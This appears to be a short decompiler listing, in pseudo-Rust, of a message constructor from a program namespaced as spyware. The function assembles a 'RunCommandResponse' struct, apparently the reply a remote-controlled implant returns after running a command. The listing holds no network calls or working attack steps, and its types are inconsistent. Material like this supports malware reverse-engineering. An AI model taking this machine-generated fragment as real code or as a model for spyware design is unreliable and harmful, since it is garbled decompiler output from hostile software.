fn spyware::communication::messages::Message::RunCommandResponse(a0: i64, a1: i64) -> double {
    let v1: u128;  // xmm0
    let v2: u128;  // xmm1

    v1 = *(a1 as &i128);
    v2 = *((a1 + 16) as &i128);
    return struct64 {
        field_0: 9223372036854775809
        field_8: v1
        field_24: v2
        field_40: *((a1 + 32) as &i128)
        field_56: *((a1 + 48) as &i64)
    };
}
